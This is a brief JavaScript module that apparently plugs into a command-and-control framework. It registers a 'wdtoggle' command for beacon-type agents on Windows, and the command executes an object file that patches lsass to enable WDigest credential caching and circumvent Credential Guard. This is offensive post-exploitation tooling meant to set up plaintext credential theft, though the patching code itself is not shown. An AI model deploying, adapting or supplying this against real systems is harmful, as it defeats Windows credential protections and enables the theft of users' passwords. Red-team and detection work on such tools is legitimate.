var metadata = {
    name: "WdToggle",
    description: "Enable WDigest credential caching and circumvent Credential Guard"
};

var cmd_wdtoggle = ax.create_command("wdtoggle", "Patch lsass to enable WDigest credential caching and circumvent Credential Guard (if enabled)", "wdtoggle");
cmd_wdtoggle.setPreHook(function (id, cmdline, parsed_json) {
    var bof_path = ax.script_dir() + "WdToggle." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: enable WDigest credential caching");
});

var group_wdtoggle = ax.create_commands_group("WdToggle-BOF", [cmd_wdtoggle]);
ax.register_commands_group(group_wdtoggle, ["beacon", "gopher", "kharon"], ["windows"], []);
